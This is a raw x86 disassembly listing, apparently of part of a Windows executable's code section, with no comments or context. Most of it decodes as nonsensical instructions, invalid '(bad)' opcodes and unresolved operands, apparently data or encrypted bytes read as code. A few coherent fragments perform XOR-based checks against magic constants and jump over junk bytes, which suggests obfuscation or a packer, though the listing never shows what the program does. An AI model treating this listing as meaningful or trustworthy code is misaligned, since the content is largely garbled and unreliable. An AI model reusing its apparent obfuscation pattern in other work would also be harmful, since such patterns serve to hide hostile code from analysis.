  40210a:	mov    bh,0x46
  40210c:	inc    esi
  40210d:	std    
  40210e:	rol    BYTE PTR [ecx+ecx*8+0x3098b0f8],1
  402115:	gs loopne 0x4020d5
  402118:	cmc    
  402119:	xchg   ebx,eax
  40211a:	xor    edi,edx
  40211c:	push   esi
  40211d:	out    0x17,al
  40211f:	fwait
  402120:	rol    DWORD PTR [ecx-0x56],1
  402123:	sahf   
  402124:	cs xchg edx,eax
  402126:	sbb    al,0x47
  402128:	clc    
  402129:	xchg   esi,eax
  40212a:	fcomp  QWORD PTR [esi-0x45e360a7]
  402130:	cmp    BYTE PTR [eax+0x4f5f59bd],dl
  402136:	adc    DWORD PTR [ebx-0x6079a734],ebx
  40213c:	jo     0x402153
  40213e:	inc    ebx
  40213f:	push   esi
  402140:	add    al,0xd0
  402142:	xchg   ebx,eax
  402143:	pop    ecx
  402144:	frstor [ebp+0x453840f]
  40214a:	(bad)  
  40214b:	fist   WORD PTR [ebp-0x65319ded]
  402151:	mov    eax,ds:0x4a927d8d
  402156:	(bad)  
  402157:	mov    ebx,0xb2765859
  40215c:	mov    esi,0x4eda7635
  402161:	mov    ebp,0xcd608edd
  402166:	pop    edx
  402167:	sub    DWORD PTR ds:0xff4992ef,ebx
  40216d:	jle    0x40210b
  40216f:	mov    ebp,0xda8f94e9
  402174:	out    0xe5,al
  402176:	add    ah,BYTE PTR [esi]
  402178:	adc    bh,BYTE PTR [ecx+ecx*2-0x66]
  40217c:	dec    esp
  40217d:	adc    cl,bh
  40217f:	dec    edx
  402180:	adc    al,0x94
  402182:	inc    ebx
  402183:	imul   DWORD PTR [esi]
  402185:	ins    DWORD PTR es:[edi],dx
  402186:	psrad  mm3,QWORD PTR [ebx]
  402189:	pop    ebx
  40218a:	push   ebx
  40218b:	pcmpgtb mm5,mm1
  40218e:	out    dx,eax
  40218f:	rcr    BYTE PTR [edi-0x250ee37f],cl
  402195:	push   cs
  402196:	ret    0xc450
  402199:	xchg   esp,eax
  40219a:	add    DWORD PTR es:[esi+0x15859ee6],edx
  4021a1:	pop    ss
  4021a2:	rol    BYTE PTR [edi-0x28ab58d2],0x3e
  4021a9:	inc    ebp
  4021aa:	(bad)  
  4021ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021ad:	ss iret 
  4021af:	js     0x4021e7
  4021b1:	jge    0x402178
  4021b3:	and    eax,eax
  4021b5:	sub    dl,BYTE PTR [edx-0x29]
  4021b8:	dec    esp
  4021b9:	lods   eax,DWORD PTR ds:[esi]
  4021ba:	retf   0x7e7f
  4021bd:	dec    ecx
  4021be:	hlt    
  4021bf:	ins    DWORD PTR es:[edi],dx
  4021c0:	in     eax,0x4e
  4021c2:	xchg   esi,eax
  4021c3:	pop    es
  4021c4:	or     BYTE PTR [ecx+0x32],bh
  4021c7:	inc    ecx
  4021c8:	ficom  WORD PTR [edx]
  4021ca:	jne    0x40222d
  4021cc:	push   ss
  4021cd:	out    dx,eax
  4021ce:	int    0xa4
  4021d0:	leave  
  4021d1:	popa   
  4021d2:	stc    
  4021d3:	iret   
  4021d4:	js     0x40223c
  4021d6:	rcr    BYTE PTR [ebx],cl
  4021d8:	push   0xffffff84
  4021da:	clc    
  4021db:	std    
  4021dc:	push   eax
  4021dd:	xchg   DWORD PTR [eax-0x4f],edi
  4021e0:	or     edi,DWORD PTR [ebp+0x21]
  4021e3:	fistp  WORD PTR [edi*8-0x4fe8697a]
  4021ea:	mov    ecx,0x9f1cb093
  4021ef:	xlat   BYTE PTR ds:[ebx]
  4021f0:	inc    ebp
  4021f1:	enter  0x5fb7,0x9a
  4021f5:	mov    edx,0x8e71c2e8
  4021fa:	aad    0x9b
  4021fc:	dec    esi
  4021fd:	out    0x42,eax
  4021ff:	cmc    
  402200:	stc    
  402201:	mov    cl,0x76
  402203:	retf   0x35cf
  402206:	int3   
  402207:	jb     0x4021d8
  402209:	gs retf 
  40220b:	jnp    0x4021b4
  40220d:	pop    eax
  40220e:	mov    ch,0xe
  402210:	push   0x1d
  402212:	mov    dh,0xa0
  402214:	lods   eax,DWORD PTR ds:[esi]
  402215:	lods   eax,DWORD PTR ds:[esi]
  402216:	inc    eax
  402217:	push   DWORD PTR ds:0xd8009e13
  40221d:	lea    edi,[esi-0x7b0d9]
  402223:	sub    al,ah
  402225:	cvtpi2ps xmm5,mm0
  402228:	inc    esi
  402229:	push   eax
  40222a:	jo     0x4021bd
  40222c:	jo     0x402200
  40222e:	pop    esp
  40222f:	fcomip st,st(4)
  402231:	clc    
  402232:	aad    0x23
  402234:	inc    ecx
  402235:	mov    eax,ds:0xc6f23d04
  40223a:	fmul   QWORD PTR [esi-0x25bda5ab]
  402240:	push   esi
  402241:	repnz push 0x2b
  402244:	push   esi
  402245:	dec    eax
  402246:	dec    ecx
  402247:	add    ebx,esp
  402249:	jo     0x402281
  40224b:	arpl   cx,sp
  40224d:	cmp    BYTE PTR [ebx+0x74],0x78
  402251:	pusha  
  402252:	mov    dl,0xf6
  402254:	in     eax,dx
  402255:	pop    ds
  402256:	cmp    eax,0x6da034cb
  40225b:	jge    0x4022d7
  40225d:	dec    edi
  40225e:	fld    DWORD PTR [ecx-0x50]
  402261:	ret    
  402262:	xor    BYTE PTR [ebp+0x7f],bh
  402265:	ins    DWORD PTR es:[edi],dx
  402266:	loope  0x4021f0
  402268:	imul   ebp,ebp,0x9a88dc20
  40226e:	cmp    BYTE PTR [esi+0x16],0xd6
  402272:	jb     0x402248
  402274:	dec    ebx
  402275:	fisttp WORD PTR [edi]
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ecx-0x21],esp
  40229c:	xlat   BYTE PTR ds:[ebx]
  40229d:	out    dx,al
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	sub    al,0x2b
  4022a8:	test   DWORD PTR [edi+0x6c03d082],ecx
  4022ae:	(bad)  
  4022af:	rol    BYTE PTR [esi-0x72],1
  4022b2:	xchg   BYTE PTR [ebp-0x110791f0],ah
  4022b8:	ficomp DWORD PTR [ebx+0x543d9cf3]
  4022be:	cs push edi
  4022c0:	and    DWORD PTR [esi+0x56],eax
  4022c3:	mov    DWORD PTR [edx-0x76],ebx
  4022c6:	jl     0x4022a3
  4022c8:	adc    bl,BYTE PTR [edi+esi*2]
  4022cb:	nop
  4022cc:	fsubrp st(7),st
  4022ce:	adc    DWORD PTR [ebx],edi
  4022d0:	push   cs
  4022d1:	bound  eax,QWORD PTR [eax]
  4022d3:	arpl   cx,bx
  4022d5:	ret    0xabb9
  4022d8:	les    esp,FWORD PTR [ebx+0x12]
  4022db:	repnz sbb eax,0x2615a201
  4022e1:	call   0xfd68:0xb9004fdb
  4022e8:	pop    eax
  4022e9:	cmp    dh,BYTE PTR [edi-0x1a9266d8]
  4022ef:	push   ss
  4022f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f1:	jo     0x402299
  4022f3:	int    0x14
  4022f5:	fstp   DWORD PTR [ebx+ecx*4]
  4022f8:	xor    dh,0xd1
  4022fb:	xchg   DWORD PTR [eax-0x21],edi
  4022fe:	xor    al,0x3e
  402300:	push   edx
  402301:	test   al,0x15
  402303:	mov    edi,cs
  402305:	retf   
  402306:	push   esp
  402307:	(bad)  
  402308:	int3   
  402309:	aaa    
  40230a:	mov    esi,0x96066fec
  40230f:	in     al,0x69
  402311:	(bad)  
  402312:	xor    BYTE PTR [esi-0x2322bddb],ah
  402318:	out    dx,al
  402319:	icebp  
  40231a:	or     al,0x47
  40231c:	pop    ss
  40231d:	outs   dx,DWORD PTR ds:[esi]
  40231e:	hlt    
  40231f:	enter  0x1a47,0x2a
  402323:	aad    0x51
  402325:	pop    edx
  402326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402327:	aad    0x36
  402329:	pop    esp
  40232a:	dec    BYTE PTR [edx]
  40232c:	add    edx,DWORD PTR [edx+ecx*1+0x377c95b9]
  402333:	xchg   esp,eax
  402334:	and    DWORD PTR [eax],esi
  402336:	add    DWORD PTR [ebp+0x2b8fb49f],edx
  40233c:	mov    ?,edi
  40233e:	rcl    DWORD PTR [edi+0x2f10520f],0xfd
  402345:	dec    esi
  402346:	sar    DWORD PTR [ebp-0x1afd50de],0x66
  40234d:	clc    
  40234e:	fisttp WORD PTR fs:0x3bf99cb7
  402355:	enter  0x4928,0x5a
  402359:	mov    WORD PTR [edi+0x79],cs
  40235c:	pop    ecx
  40235d:	retf   0xcaec
  402360:	dec    DWORD PTR [edx+ebx*1]
  402363:	(bad)  
  402364:	push   edi
  402365:	pop    ds
  402366:	sahf   
  402367:	sbb    DWORD PTR [esi+0x3c],ebp
  40236a:	adc    al,0xa3
  40236c:	mov    BYTE PTR [eax+ebx*1-0x607ce59b],ch
  402373:	aaa    
  402374:	aas    
  402375:	push   esp
  402376:	scas   al,BYTE PTR es:[edi]
  402377:	xor    ecx,DWORD PTR [ebp-0x4ab25ecc]
  40237d:	mov    WORD PTR [ecx],cs
  40237f:	cdq    
  402380:	test   DWORD PTR [edx+0xc],edi
  402383:	out    dx,al
  402384:	or     al,0x5b
  402386:	in     eax,0xd
  402388:	mov    bl,BYTE PTR [edx+0x6a0a1de4]
  40238e:	in     eax,dx
  40238f:	in     eax,0x67
  402391:	call   0xe1bb9f42
  402396:	add    eax,0x37e03544
  40239b:	dec    edx
  40239c:	loope  0x402321
  40239e:	add    al,0xe5
  4023a0:	pop    eax
  4023a1:	scas   al,BYTE PTR es:[edi]
  4023a2:	std    
  4023a3:	cld    
  4023a4:	and    ecx,DWORD PTR [edx+ebp*1+0x4ca6dcf7]
  4023ab:	das    
  4023ac:	jle    0x40237c
  4023ae:	aaa    
  4023af:	xlat   BYTE PTR ds:[ebx]
  4023b0:	int    0x93
  4023b2:	int    0x20
  4023b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b5:	or     al,BYTE PTR [esi+0x14]
  4023b8:	xlat   BYTE PTR ds:[ebx]
  4023b9:	add    eax,0xaa0ad831
  4023be:	mov    ds:0x8d5d9690,eax
  4023c3:	push   0xa8b6122e
  4023c8:	sub    DWORD PTR ds:0x954a681f,esp
  4023ce:	(bad)  
  4023cf:	mov    ecx,0x44d15df6
  4023d4:	mov    esp,0xb4563820
  4023d9:	or     BYTE PTR [esi+0x239d6923],dl
  4023df:	fs mov bh,0x35
  4023e2:	aas    
  4023e3:	jne    0x40244a
  4023e5:	xchg   ebx,eax
  4023e6:	xor    DWORD PTR [bx+di],ebx
  4023e9:	mov    dl,BYTE PTR [ecx]
  4023eb:	xchg   ecx,eax
  4023ec:	jo     0x402456
  4023ee:	stos   BYTE PTR es:[edi],al
  4023ef:	mov    edi,0xab702534
  4023f4:	mov    eax,ds:0xa0219a0b
  4023f9:	inc    ecx
  4023fa:	xchg   edx,eax
  4023fb:	mov    ds:0xacf90d4d,al
  402400:	pop    eax
  402401:	sub    DWORD PTR [edx-0x2a417c2b],0x1775563a
  40240b:	xor    DWORD PTR [esp+ecx*2+0x6],ecx
  40240f:	shl    BYTE PTR [edx],cl
  402411:	push   0xced0987b
  402416:	cld    
  402417:	sub    dl,cl
  402419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40241a:	xor    BYTE PTR [esi+ebx*4],al
  40241d:	sub    eax,0xf1905697
  402422:	and    BYTE PTR [ecx+edi*1+0x79],bl
  402426:	leave  
  402427:	xchg   BYTE PTR [esi+0x8],ah
  40242a:	or     al,0x8a
  40242c:	dec    eax
  40242d:	cs xor eax,edx
  402430:	mov    BYTE PTR [eax+0x1c927d5d],cl
  402436:	or     esp,DWORD PTR [ebp+0x52]
  402439:	and    eax,0xf2a8bdb6
  40243e:	push   0xa6d550d1
  402443:	test   al,0xf5
  402445:	pop    ds
  402446:	rcr    DWORD PTR [ecx],1
  402448:	mov    ?,WORD PTR [edi+0x6d]
  40244b:	mov    ebp,0xeffd1c05
  402450:	aam    0xae
  402452:	pop    ecx
  402453:	jecxz  0x4024b6
  402455:	cwde   
  402456:	ins    BYTE PTR es:[edi],dx
  402457:	mov    eax,0x802a5e33
  40245c:	jnp    0x4024ac
  40245e:	add    al,0x15
  402460:	adc    al,0xb
  402462:	mov    esi,0xfbad90a0
  402467:	into   
  402468:	int3   
  402469:	or     BYTE PTR [eax+0x7ba6179e],cl
  40246f:	ja     0x402451
  402471:	out    0xc2,al
  402473:	push   esi
  402474:	xchg   DWORD PTR [eax-0x7f3a30d6],edx
  40247a:	fcomp  DWORD PTR [edi+0x35484e9]
  402480:	dec    ebp
  402481:	repnz hlt 
  402483:	jb     0x4024c2
  402485:	ins    BYTE PTR es:[edi],dx
  402486:	push   0xacc6d641
  40248b:	retf   0x90b8
  40248e:	out    0x99,al
  402490:	rol    BYTE PTR [ebp+0x29887f67],1
  402496:	jle    0x402452
  402498:	jnp    0x40243a
  40249a:	mov    al,0xa2
  40249c:	cmp    dh,bh
  40249e:	out    dx,al
  40249f:	xchg   ecx,eax
  4024a0:	out    0xdb,eax
  4024a2:	fbstp  TBYTE PTR [ebx+0x34]
  4024a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x24835c37],cl
  4024f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f5:	jo     0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	shr    DWORD PTR [ebx-0x1db6a48a],1
  402503:	mov    cl,0x21
  402505:	call   0xe935:0x587751a4
  40250c:	xchg   ecx,eax
  40250d:	test   eax,0xd35cee7
  402512:	test   eax,0x3c5a9cc7
  402517:	outs   dx,BYTE PTR ds:[esi]
  402518:	sbb    al,0xd5
  40251a:	outs   dx,DWORD PTR ds:[esi]
  40251b:	scas   al,BYTE PTR es:[edi]
  40251c:	(bad)  
  40251d:	or     eax,0x6c12221e
  402522:	add    eax,0x90c60973
  402527:	out    dx,eax
  402528:	mov    eax,0xc05b461e
  40252d:	shl    DWORD PTR [ebp-0x6a],1
  402530:	addr16 ss retf 
  402533:	out    0x88,al
  402535:	in     al,0x4b
  402537:	inc    esp
  402538:	inc    edi
  402539:	jns    0x402595
  40253b:	addr16 ja 0x40256e
  40253e:	adc    al,0x98
  402540:	sbb    bl,0x8a
  402543:	cmp    bl,BYTE PTR [ebp+0x24507309]
  402549:	pop    esi
  40254a:	dec    esi
  40254b:	push   ebx
  40254c:	outs   dx,DWORD PTR ds:[esi]
  40254d:	add    al,0x4c
  40254f:	ret    
  402550:	sub    al,0x85
  402552:	mov    dh,0x7a
  402554:	cmp    DWORD PTR [ecx-0x74eb9249],ecx
  40255a:	ins    BYTE PTR es:[edi],dx
  40255b:	loopne 0x40259e
  40255d:	xchg   ebx,eax
  40255e:	mov    ebp,0x3324070b
  402563:	ja     0x402514
  402565:	repz inc eax
  402567:	in     al,dx
  402568:	xchg   esi,eax
  402569:	push   ebx
  40256a:	push   edx
  40256b:	fst    DWORD PTR [eax]
  40256d:	dec    esi
  40256e:	jno    0x4025e2
  402570:	ins    BYTE PTR es:[edi],dx
  402571:	and    BYTE PTR [ebx+0x4f],dl
  402574:	cmc    
  402575:	and    BYTE PTR [edi+eax*8+0x6f],al
  402579:	jg     0x402540
  40257b:	dec    ebx
  40257c:	push   0xfdd96693
  402581:	dec    eax
  402582:	sbb    esi,ebx
  402584:	adc    DWORD PTR [ecx-0x39],eax
  402587:	mov    DWORD PTR [edx+0x25ed935e],esp
  40258d:	dec    eax
  40258e:	cmp    BYTE PTR [eax],0x2
  402591:	adc    dl,dh
  402593:	jmp    0x1d76:0x3eddf88
  40259a:	xchg   edi,eax
  40259b:	enter  0x77a,0xc8
  40259f:	adc    DWORD PTR [ecx],edx
  4025a1:	loopne 0x402620
  4025a3:	mov    dh,BYTE PTR [edi-0x12a8f069]
  4025a9:	cmp    ebx,edi
  4025ab:	xchg   edi,eax
  4025ac:	pop    ecx
  4025ad:	loop   0x4025cd
  4025af:	jl     0x402532
  4025b1:	and    cl,0x35
  4025b4:	scas   al,BYTE PTR es:[edi]
  4025b5:	push   esp
  4025b6:	or     al,0x3e
  4025b8:	cmp    cl,dh
  4025ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025bb:	or     eax,0x7ef3a6b4
  4025c0:	mov    ds:0x4e254d5f,eax
  4025c5:	cmp    DWORD PTR [ebp+0x7ddc24a7],0x3107a62d
  4025cf:	test   BYTE PTR [ebx+ebp*4],al
  4025d2:	fwait
  4025d3:	mov    ch,0xe7
  4025d5:	push   esp
  4025d6:	aad    0xe9
  4025d8:	es mov ah,0x99
  4025db:	cmp    eax,0x7b052154
  4025e0:	dec    ebp
  4025e1:	scas   eax,DWORD PTR es:[edi]
  4025e2:	dec    ebx
  4025e3:	shl    BYTE PTR [ebp-0x5],0x7e
  4025e7:	out    dx,eax
  4025e8:	and    bh,BYTE PTR [ecx+0x13]
  4025eb:	sbb    dh,dh
  4025ed:	loopne 0x4025af
  4025ef:	and    ebp,esp
  4025f1:	cmp    esi,edi
  4025f3:	stc    
  4025f4:	cdq    
  4025f5:	lods   al,BYTE PTR ds:[esi]
  4025f6:	dec    eax
  4025f7:	(bad)  
  4025f8:	pop    ds
  4025f9:	leave  
  4025fa:	adc    dl,0x9a
  4025fd:	xor    DWORD PTR [ebx],esp
  4025ff:	mov    ds:0xc17261b1,eax
  402604:	fcmovnb st,st(5)
  402606:	sub    al,0xe3
  402608:	mov    ds,WORD PTR [edi-0x61cefb3f]
  40260e:	pushf  
  40260f:	adc    DWORD PTR [edx+eiz*1+0x781660e2],0x5a2ba65e
  40261a:	fsubrp st(2),st
  40261c:	fld    QWORD PTR [ecx-0x4b]
  40261f:	push   ds
  402620:	lock dec ecx
  402622:	pop    eax
  402623:	(bad)  
  402624:	mov    esp,0xa41e5834
  402629:	jle    0x40267a
  40262b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40262c:	and    DWORD PTR [esi],eax
  40262e:	shl    ah,0xa2
  402631:	and    ch,BYTE PTR [bx+si-0x2f7d]
  402636:	xchg   DWORD PTR [esi+0x17],ecx
  402639:	jle    0x4025ea
  40263b:	gs retf 0x6c23
  40263f:	push   es
  402640:	sub    ebx,DWORD PTR [ecx-0x29]
  402643:	jae    0x40261a
  402645:	fstp   st(5)
  402647:	popa   
  402648:	dec    edx
  402649:	mov    eax,ds:0x31cb6eb9
  40264e:	(bad)  
  40264f:	adc    al,0x85
  402651:	or     edi,ebp
  402653:	cmp    eax,DWORD PTR [eax+edi*1-0x15]
  402657:	mov    BYTE PTR [edx],al
  402659:	jmp    0x4026b6
  40265b:	jge    0x4025f2
  40265d:	add    BYTE PTR [ecx+0x72],al
  402660:	lods   eax,DWORD PTR ds:[esi]
  402661:	add    BYTE PTR [edi+eiz*8],bh
  402664:	fwait
  402665:	mov    ds:0xbcf67157,al
  40266a:	or     al,BYTE PTR [esi-0x5ab95e2c]
  402670:	fstp   DWORD PTR [ebp-0x2e]
  402673:	jo     0x40267c
  402675:	retf   0x6c24
  402678:	data16 xor al,0xa7
  40267b:	stos   BYTE PTR es:[edi],al
  40267c:	bound  eax,QWORD PTR [ebp+0x64]
  40267f:	cdq    
  402680:	dec    edi
  402681:	popf   
  402682:	data16 clc 
  402684:	(bad)  
  402685:	out    dx,al
  402686:	dec    eax
  402687:	push   eax
  402688:	scas   eax,DWORD PTR es:[edi]
  402689:	mov    ch,0x70
  40268b:	or     DWORD PTR [eax-0x7c],ecx
  40268e:	xchg   DWORD PTR [ecx],ebp
  402690:	or     al,0x45
  402692:	jae    0x4026f8
  402694:	enter  0x8c05,0x4d
  402698:	fcomp  QWORD PTR [esi]
  40269a:	imul   BYTE PTR [esi+0x7f]
  40269d:	mov    ch,0x5d
  40269f:	sti    
  4026a0:	or     al,BYTE PTR [ebx]
  4026a2:	ss mov di,0x661d
  4026a7:	sahf   
  4026a8:	xchg   esi,eax
  4026a9:	aas    
  4026aa:	push   ebx
  4026ab:	lahf   
  4026ac:	fdivr  st(3),st
  4026ae:	adc    edx,DWORD PTR [edx]
  4026b0:	scas   al,BYTE PTR es:[edi]
  4026b1:	mov    eax,0x1a6e2d2d
  4026b6:	sbb    bh,0xcf
  4026b9:	cmp    DWORD PTR [ecx+0x8],eax
  4026bc:	inc    ebx
  4026bd:	cmp    al,0x6c
  4026bf:	and    esp,ebx
  4026c1:	fstp   DWORD PTR [esi*4-0x3cdac28a]
  4026c8:	mov    BYTE PTR [edi],0x40
  4026cb:	add    cl,BYTE PTR [ebx+esi*4]
  4026ce:	int    0xc8
  4026d0:	outs   dx,DWORD PTR ds:[esi]
  4026d1:	(bad)  
  4026d2:	jl     0x402664
  4026d4:	lods   eax,DWORD PTR ds:[esi]
  4026d5:	push   esi
  4026d6:	(bad)  
  4026d7:	addr16 cwde 
  4026d9:	xchg   esp,eax
  4026da:	repz adc al,0x72
  4026dd:	mov    ds:0xc3fc4b2b,al
  4026e2:	pop    edx
  4026e3:	ss js  0x40274c
  4026e6:	dec    eax
  4026e7:	xor    eax,0x5dacd171
  4026ec:	popf   
  4026ed:	xor    BYTE PTR [eax],0x67
  4026f0:	lds    ebx,FWORD PTR [ebp+0xa]
  4026f3:	sbb    al,0xf4
  4026f5:	imul   si,WORD PTR [edx+0x4d],0x6fe0
  4026fb:	mov    dl,0xe3
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xf4890f84
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	mov    ah,0x2d
  402769:	int    0xdf
  40276b:	xchg   ebp,eax
  40276c:	xor    eax,DWORD PTR [ebp-0xf87635]
  402772:	cvttps2pi mm1,xmm2
  402775:	mov    BYTE PTR [eax],ah
  402777:	jno    0x4027d9
  402779:	cld    
  40277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277b:	lods   al,BYTE PTR ds:[esi]
  40277c:	cli    
  40277d:	mov    dl,0xc8
  40277f:	pop    ebp
  402780:	dec    ebx
  402781:	leave  
  402782:	jns    0x40272f
  402784:	mov    ds:0xf77ac7a0,al
  402789:	cwde   
  40278a:	dec    ecx
  40278b:	and    BYTE PTR [edx+esi*1],dl
  40278e:	cs add esi,ebp
  402791:	jne    0x402773
  402793:	add    eax,0xf3d85a9a
  402798:	adc    al,0x18
  40279a:	push   0xffffffe5
  40279c:	cmp    DWORD PTR [ebx],0x7d04943b
  4027a2:	fsubr  DWORD PTR [edx]
  4027a4:	inc    edi
  4027a5:	adc    BYTE PTR [esi+0x7994be7d],ch
  4027ab:	inc    edx
  4027ac:	test   eax,0xc701b12b
  4027b1:	test   al,0xac
  4027b3:	cdq    
  4027b4:	push   es
  4027b5:	cmp    ah,BYTE PTR [esi*1-0x6db04779]
  4027bc:	mov    esp,gs
  4027be:	lea    esi,[edi+0x76]
  4027c1:	push   cs
  4027c2:	pop    ss
  4027c3:	dec    ebx
  4027c4:	sahf   
  4027c5:	clc    
  4027c6:	push   0x56
  4027c8:	sahf   
  4027c9:	push   ebx
  4027ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027cb:	ja     0x402843
  4027cd:	push   edx
  4027ce:	sbb    BYTE PTR [ebx+0x6b],ah
  4027d1:	or     BYTE PTR [eax],dl
  4027d3:	cmp    eax,DWORD PTR [edx-0x44]
  4027d6:	pop    esi
  4027d7:	push   edx
  4027d8:	xor    DWORD PTR [ebx],eax
  4027da:	push   0x3e
  4027dc:	loopne 0x402778
  4027de:	mov    ?,WORD PTR [ebx+esi*1-0x28]
  4027e2:	cmovno eax,ebp
  4027e5:	scas   al,BYTE PTR es:[edi]
  4027e6:	xchg   edx,edx
  4027e8:	fnstenv [ebp+0x63411491]
  4027ee:	sahf   
  4027ef:	imul   edi,DWORD PTR ss:[esp+eax*8],0x77c77cba
  4027f7:	stc    
  4027f8:	(bad)  
  4027f9:	mov    ds:0xeb4214c6,eax
  4027fe:	mov    cl,0xd8
  402800:	pop    ebx
  402801:	jno    0x402815
  402803:	js     0x402882
  402805:	sbb    BYTE PTR [eax+0x44],ch
  402808:	inc    edi
  402809:	call   0xca1847aa
  40280e:	in     al,dx
  40280f:	lock sti 
  402811:	mov    esp,DWORD PTR [edx+0x7c]
  402814:	xchg   ebp,eax
  402815:	adc    eax,0x175de536
  40281a:	inc    edx
  40281b:	pop    ds
  40281c:	dec    edx
  40281d:	shl    DWORD PTR [edi-0x402a556a],0x3e
  402824:	mov    esi,0x9946a4f7
  402829:	mov    eax,0x247a097a
  40282e:	sbb    al,0x45
  402830:	fxch   st(3)
  402832:	repz out dx,al
  402834:	outs   dx,DWORD PTR ds:[esi]
  402835:	pop    esp
  402836:	pop    es
  402837:	inc    edx
  402838:	mov    ch,0x22
  40283a:	push   eax
  40283b:	retf   
  40283c:	rcl    BYTE PTR [ebp-0x40],0xd7
  402840:	dec    ebp
  402841:	ins    DWORD PTR es:[edi],dx
  402842:	xor    eax,0x6b3f54f2
  402847:	jg     0x4028bf
  402849:	outs   dx,DWORD PTR ds:[esi]
  40284a:	sbb    BYTE PTR [edx+0x4a84ac74],dh
  402850:	pop    esp
  402851:	mov    ebp,0x3470d1f0
  402856:	shl    BYTE PTR [edx-0x635d5432],cl
  40285c:	std    
  40285d:	je     0x402845
  40285f:	mov    al,ds:0x3e2d6926
  402864:	bound  ecx,QWORD PTR [ebp+0x71]
  402867:	fldenv [eax-0x7f17301]
  40286d:	cwde   
  40286e:	sub    BYTE PTR [edi],ch
  402870:	(bad)  
  402871:	push   edi
  402872:	(bad)  [edx+0x79]
  402875:	call   0xf8f2:0xb45eb057
  40287c:	(bad)  
  40287d:	jmp    0xeb2869cf
  402882:	jge    0x402813
  402884:	push   0xffffffdd
  402886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402887:	test   DWORD PTR [ebx+0xa2d0b28],esi
  40288d:	inc    ecx
  40288e:	adc    DWORD PTR [ebx],esp
  402890:	cmp    al,0x3f
  402892:	xchg   DWORD PTR [ebx+eax*1+0x6c],edx
  402896:	pop    ecx
  402897:	inc    ebx
  402898:	jae    0x4028ec
  40289a:	sub    cl,BYTE PTR [ebx]
  40289c:	add    al,0xb6
  40289e:	mov    ch,0xc8
  4028a0:	sbb    esp,DWORD PTR [ebx+edx*1-0x77]
  4028a4:	pop    edx
  4028a5:	sub    BYTE PTR [ebx],dh
  4028a7:	es pop ebx
  4028a9:	jb     0x4028e8
  4028ab:	cs nop
  4028ad:	pop    ebp
  4028ae:	popf   
  4028af:	push   ds
  4028b0:	mov    eax,ds:0x461f9b0b
  4028b5:	jnp    0x40287a
  4028b7:	out    dx,al
  4028b8:	jge    0x4028ac
  4028ba:	push   es
  4028bb:	test   al,0xb2
  4028bd:	imul   edi,DWORD PTR [edx+edi*4+0x59],0xffffffe6
  4028c2:	jno    0x4028c1
  4028c4:	xchg   edx,eax
  4028c5:	push   ecx
  4028c6:	ins    DWORD PTR es:[edi],dx
  4028c7:	in     al,0x5d
  4028c9:	xchg   edx,eax
  4028ca:	das    
  4028cb:	xchg   ebx,eax
  4028cc:	push   0xffffffd3
  4028ce:	imul   ecx,DWORD PTR [edx+0x76],0x48
  4028d2:	mov    ch,0xc5
  4028d4:	loopne 0x402867
